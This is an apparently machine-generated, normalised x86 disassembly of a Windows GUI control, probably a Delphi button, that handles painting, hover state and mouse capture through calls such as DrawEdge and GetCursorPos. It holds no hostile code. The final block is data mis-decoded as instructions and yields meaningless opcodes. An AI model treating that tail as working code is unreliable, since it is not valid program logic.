sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_412ae8
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_404268
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_412ae8
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_412ae8
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_412ae8
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_42f548
call sub_42f628
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_42d354
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_42d028
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_42cde4
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_42cf48
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_42d3c4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43bc64
mov eax esi
mov edx [ r-xdata ]
call sub_403408
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_42d3e8
push ebx
mov ebx eax
mov eax ebx
call sub_449250
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_42d434
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403408
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_42d464
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_42dd14
sub_42d484
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_42dda0
sub_42d4a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42c608
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_42dcd4
mov ecx esi
xor edx edx
mov eax ebx
call sub_444930
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_43d04c
mov edx 0xff00000f
mov eax ebx
call sub_43d0c0
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_42d564
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44498c
mov eax [ esi + 0x16c ]
call sub_403258
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_42d59c
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_42d9c6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_41dc4c
call sub_42f548
call sub_42f628
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_412b10
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_41dd2c
mov edx eax
mov eax esi
call sub_43a074
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41dd2c
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41dd2c
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_42f548
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_42f94c
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41dd2c
push eax
call sub_42f548
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f734
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41dd2c
push eax
call sub_42f548
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f698
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_42f548
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_42f88c
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_41dd2c
push eax
call sub_42f548
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f734
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_41dd2c
push eax
call sub_42f548
lea ecx [ ebp - 0x28 ]
pop edx
call sub_42f698
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_41d5e4
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d988
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_412ae8
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_43cf20
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_43f200
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42d354
mov edx 0xff000014
mov eax 0xff00000f
call sub_424098
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_41d5b8
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_41d988
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42d9cd
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fcc
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_412ae8
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41ce18
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_43cf20
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_43f200
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_42d354
jmp r-xdata
mov bl 0x5
jmp r-xdata
sub_42d9d4
push ebx
push esi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_43b7cc
cmp esi eax
sete bl
xor bl 0x1
mov [ esi + 0x181 ] bl
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax esi
call sub_43e0d4
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax esi
call sub_43e0d4
jmp r-xdata
sub_42da38
push ebx
mov ebx eax
mov eax ebx
call sub_43efdc
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov edx eax
mov eax [ ebx + 0x16c ]
call sub_42c80c
pop ebx
retn
sub_42da64
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_43e4e8
test bl bl
jne r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
jne r-xdata
mov [ esi + 0x171 ] 0x1
mov [ esi + 0x182 ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dabc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
push edi
mov ecx esi
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43e7a0
cmp [ ebx + 0x171 ] 0x0
je r-xdata
cmp [ ebx + 0x181 ] 0x0
jne r-xdata
cmp [ ebx + 0x170 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax ebx
call sub_42d9d4
mov [ ebp - 0x2 ] 0x3
mov [ ebp - 0x2 ] 0x0
jmp r-xdata
mov al [ ebp - 0x2 ]
cmp al [ ebx + 0x182 ]
je r-xdata
mov eax ebx
call sub_43c924
cmp esi eax
jge r-xdata
test esi esi
jl r-xdata
mov al [ ebp - 0x2 ]
mov [ ebx + 0x182 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
test edi edi
jl r-xdata
mov eax ebx
call sub_43c968
cmp edi eax
jg r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebp - 0x2 ] 0x2
mov [ ebp - 0x2 ] 0x3
jmp r-xdata
sub_42db5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
push esi
push edi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43e848
cmp [ ebx + 0x171 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov [ ebx + 0x171 ] 0x0
test esi esi
jl r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_43c924
cmp esi eax
jge r-xdata
mov [ ebp - 0x3 ] al
cmp [ ebx + 0x168 ] 0x0
jne r-xdata
test edi edi
jl r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov [ ebx + 0x182 ] 0x0
mov [ ebx + 0x181 ] 0x0
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov eax ebx
call sub_43c968
cmp edi eax
jle r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov dl [ ebx + 0x170 ]
xor dl 0x1
mov eax ebx
call sub_42dd14
cmp [ ebx + 0x170 ] 0x0
je r-xdata
cmp [ ebp - 0x3 ] 0x0
je r-xdata
mov al [ ebx + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
mov [ ebx + 0x182 ] 0x3
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
mov eax ebx
call sub_42d9d4
mov eax ebx
mov si 0xffeb
call sub_403454
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
sub_42dca8
push esi
mov esi eax
test dl dl
jae r-xdata
cmp dl 0x4
jbe r-xdata
mov dl 0x1
jmp r-xdata
mov eax [ esi + 0x16c ]
cmp dl [ eax + 0x20 ]
je r-xdata
mov dl 0x4
pop esi
retn
call sub_42c7e4
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42dcdc
add esp 0xfffffff0
mov edx [ eax + 0x168 ]
test edx edx
je r-xdata
add esp 0x10
retn
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb018
mov [ esp + 0x4 ] edx
mov [ esp + 0x8 ] eax
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
mov eax [ eax + 0x30 ]
call sub_440458
sub_42dd14
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x168 ] 0x0
jne r-xdata
cmp bl [ esi + 0x170 ]
je r-xdata
xor ebx ebx
pop esi
pop ebx
retn
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov [ esi + 0x170 ] bl
test bl bl
je r-xdata
cmp [ esi + 0x172 ] 0x0
je r-xdata
mov [ esi + 0x182 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ esi + 0x182 ] 0x0
jne r-xdata
mov eax esi
call sub_42dcdc
mov [ esi + 0x182 ] 0x3
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
test bl bl
je r-xdata
sub_42de0c
push esi
mov esi eax
cmp dl [ esi + 0x178 ]
je r-xdata
pop esi
retn
mov [ esi + 0x178 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42de7c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
and eax 0x7f
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x16c ]
call sub_42c80c
mov eax ebx
call sub_42d9d4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
pop ebx
retn
sub_42deb0
push ebx
push esi
mov ebx eax
mov eax [ edx + 0x4 ]
cmp eax [ ebx + 0x168 ]
jne r-xdata
pop esi
pop ebx
retn
mov esi [ edx + 0x8 ]
cmp ebx esi
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov al [ esi + 0x172 ]
mov [ ebx + 0x172 ] al
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov [ ebx + 0x170 ] 0x0
mov [ ebx + 0x182 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_4494e4
sub_42df20
push ebp
mov ebp esp
push 0x0
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_42dfa9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_43cf20
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_453e3c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov eax esi
mov si 0xffeb
call sub_403454
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42dfb0
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
sub_42dfec
push ebx
push esi
mov esi eax
mov eax esi
call sub_43ec4c
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
call sub_42f548
call sub_42f628
test al al
je r-xdata
cmp [ esi + 0x5d ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ esi + 0x181 ] 0x1
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call GetCapture
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42e060
push ebx
push esi
mov esi eax
mov eax esi
call sub_43ec64
cmp [ esi + 0x180 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
test bl bl
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov [ esi + 0x181 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
call sub_42f548
call sub_42f628
test al al
je r-xdata
cmp [ esi + 0x171 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x80 ]
mov bl 0x1
sub_42e0c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_42dc78
mov ebx eax
mov edx [ esi + 0x34 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ esi + 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax ebx
call sub_422474
mov eax [ eax + 0x14 ]
mov edx 0xff00ff
call sub_41d5e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412b10
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_422474
pop edx
call sub_41d988
push 0x0
push edi
push 0x1
mov eax ebx
call sub_422474
mov edx eax
xor ecx ecx
mov eax esi
call sub_44a868
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e158
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43edf4
mov eax esi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
test bl bl
jne r-xdata
mov edx [ esi + 0x6c ]
mov eax [ ebp - 0x4 ]
call sub_42dda0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
cmp [ esi + 0x5c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_42dc78
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax [ esi + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
cmp [ esi + 0x80 ] 0x0
jl r-xdata
mov ebx esi
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_44a350
cmp eax [ ebx + 0x80 ]
jle r-xdata
push ebp
mov eax esi
mov edx [ eax + 0x80 ]
mov eax [ eax + 0x5c ]
mov eax [ eax + 0x38 ]
call sub_42e0c8
pop ecx
sub_42e214
or al [ eax ]
add [ eax ] al
test al 0x29
inc edi
add [ eax + 0x473d ] dl
add [ eax ] al
add [ ecx + ebp + 0x3bfc0047 ] ah
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffb8d7 ] ah
cmp eax [ edi ]
add [ eax ] al
add [ eax ] al
pushfd
sub [ edi ] eax
mov al 0x3c
inc edi
add [ eax ] al
add [ eax ] al
add [ eax - 0x2fffb8d7 ] bl
cmp eax 0x47
add [ eax ] al
xchg esp eax
sub [ edi ] eax
cwde
inc eax
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c004729 ] dl
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x3ecc0047 ] cl
inc edi
add [ eax ] al
add [ eax ] al
add [ eax + 0x60004729 ] cl
inc eax
inc edi
add [ eax ] al
add [ eax ] al
add [ ecx + ebp + 0x3bbc0047 ] al
inc edi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42e2bc
